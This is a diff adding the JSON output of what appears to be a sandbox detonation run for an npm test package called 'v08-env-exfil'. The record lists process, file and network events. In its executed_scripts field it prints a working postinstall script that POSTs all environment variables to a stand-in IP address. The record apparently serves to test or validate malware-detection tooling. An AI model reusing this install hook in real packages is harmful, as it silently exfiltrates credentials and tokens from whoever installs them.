@@ -1,0 +1,102 @@
+{
+ "job_id": "c9dd46fb-f14f-4965-86ec-4d4ff6d6beca",
+ "status": "completed",
+ "exit_code": 0,
+ "duration_s": 5.99,
+ "exec_events": [
+  {
+   "ts": "2026-11-04T00:40:46.195761973Z",
+   "pid": 289881,
+   "ppid": 289855,
+   "binary": "/usr/local/bin/docker-entrypoint.sh",
+   "args": "/usr/local/bin/docker-entrypoint.sh /bin/sh -c \"/bin/true pre-b8ac9dd5a6866e32; \"$@\"; rc=$?; /bin/true post-b8ac9dd5a6866e32; exit $rc\" detonator-witness npm install --no-audit --no-fund --prefix payloads/v08-env-exfil",
+   "parent_binary": "/usr/bin/containerd-shim-runc-v2",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:46.200769351Z",
+   "pid": 289916,
+   "ppid": 289881,
+   "binary": "/usr/local/bin/npm",
+   "args": "node /usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v08-env-exfil",
+   "parent_binary": "/bin/sh",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:46.201561325Z",
+   "pid": 289916,
+   "ppid": 289916,
+   "binary": "/usr/local/bin/node",
+   "args": "/usr/local/bin/npm install --no-audit --no-fund --prefix payloads/v08-env-exfil",
+   "parent_binary": "/usr/local/bin/npm",
+   "uid": 10001,
+   "cwd": "/work"
+  },
+  {
+   "ts": "2026-11-04T00:40:46.660728772Z",
+   "pid": 289935,
+   "ppid": 289916,
+   "binary": "/usr/bin/sh",
+   "args": "-c \"node scripts/setup.js\"",
+   "parent_binary": "/usr/local/bin/node",
+   "uid": 10001,
+   "cwd": "/work/payloads/v08-env-exfil"
+  },
+  {
+   "ts": "2026-11-04T00:40:46.661892860Z",
+   "pid": 289936,
+   "ppid": 289935,
+   "binary": "/usr/local/bin/node",
+   "args": "scripts/setup.js",
+   "parent_binary": "/usr/bin/sh",
+   "uid": 10001,
+   "cwd": "/work/payloads/v08-env-exfil"
+  }
+ ],
+ "connect_events": [
+  {
+   "ts": "2026-11-04T00:40:46.706211785Z",
+   "pid": 289936,
+   "binary": "/usr/local/bin/node",
+   "daddr": "203.0.113.10",
+   "dport": 80,
+   "family": "AF_INET",
+   "resolved_domain": null,
+   "protocol": "tcp"
+  }
+ ],
+ "dns_queries": [],
+ "file_events": [
+  {
+   "ts": "2026-11-04T00:40:46.312531825Z",
+   "pid": 289916,
+   "binary": "/usr/local/bin/node",
+   "path": "/home/runner/.npmrc"
+  }
+ ],
+ "executed_scripts": [
+  {
+   "path": "/work/payloads/v08-env-exfil/scripts/setup.js",
+   "package": null,
+   "sha256": "cb6467569e18070be0f3f6e64a8bb048ef19cd5681cc9e8440ec7667338f399e",
+   "content": "const http = require(\"http\");\nconst r = http.request(\n  { host: \"203.0.113.10\", method: \"POST\", path: \"/collect\", timeout: 3000 });\nr.on(\"error\", () => {}); r.on(\"timeout\", () => r.destroy());\nr.end(JSON.stringify(process.env));\n",
+   "truncated": false
+  }
+ ],
+ "decoys": {},
+ "stdout_tail": "\n> v08@1.0.0 postinstall\n> node scripts/setup.js\n\n\nup to date in 3s\n",
+ "stderr_tail": "",
+ "truncated": false,
+ "error": null,
+ "sensor": {
+  "pre_seen": true,
+  "post_seen": true
+ },
+ "resources": {
+  "cpu_s": 0.65,
+  "peak_memory_mb": 38.2,
+  "samples": 8
+ }
+}
